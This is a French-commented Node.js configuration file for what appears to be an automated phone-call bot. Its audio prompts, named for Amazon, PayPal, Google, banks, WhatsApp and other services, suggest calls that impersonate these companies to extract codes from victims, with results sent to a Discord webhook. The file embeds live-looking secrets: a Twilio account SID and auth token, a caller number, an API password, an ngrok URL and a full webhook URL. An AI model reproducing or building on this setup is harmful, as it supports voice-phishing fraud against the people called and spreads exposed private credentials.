module.exports = {
    setupdone: 'true',

    /**
     * Informations à propos du compte Twilio
     */
    accountSid: 'ACceed3527224153cfaf910df04aa0bf9d',
    authToken: '4a5ecbb5bdfa7f33fa91e67da6c80fc9',
    callerid: '+19139544687',

    /**
     * Informations à propos de l'API
     */
    apipassword: 'tbzyOL1aevCuxmrTfEctI9AiTcjRZ6sG',
    serverurl: 'http://34d7-200-68-170-18.ngrok.io',

    /**
     * Informations à propos du webhook discord
     */
    discordwebhook: 'https://discord.com/api/webhooks/887748316501270558/_-3mIFCr218SA37Ad7oYvJNmM3KegXrlMP9IMzJQh2GhQKlZEku6RWfD0R25-MJ7yjiG',

    /**
     * Port sur lequel tourne le serveur express
     */
    port: process.env.PORT || 1337,

    /**
     * Chemins de stockage des fichiers audios
     */
    amazonfilepath: './voice/fr/amazon/ask-amazon.mp3',
    cdiscountfilepath: './voice/fr/cdiscount/ask-cdiscount.mp3',
    twitterfilepath: './voice/fr/twitter/ask-twitter.mp3',
    whatsappfilepath: './voice/fr/whatsapp/ask-whatsapp.mp3',
    paypalfilepath: './voice/fr/paypal/ask-pp.mp3',
    googlefilepath: './voice/fr/google/ask-google.mp3',
    snapchatfilepath: './voice/fr/snapchat/ask-snapchat.mp3',
    instagramfilepath: './voice/fr/instagram/ask-instagram.mp3',
    facebookfilepath: './voice/fr/facebook/ask-facebook.mp3',
    endfilepath: './voice/fr/done/call-done.mp3',
    defaultfilepath: './voice/fr/default/ask-default.mp3',
    banquefilepath: './voice/fr/banque/ask-banque.mp3',

    /**
     * Contenu des sms selon les services demandés
     */
    paypalsms: 'pp test 123'
};
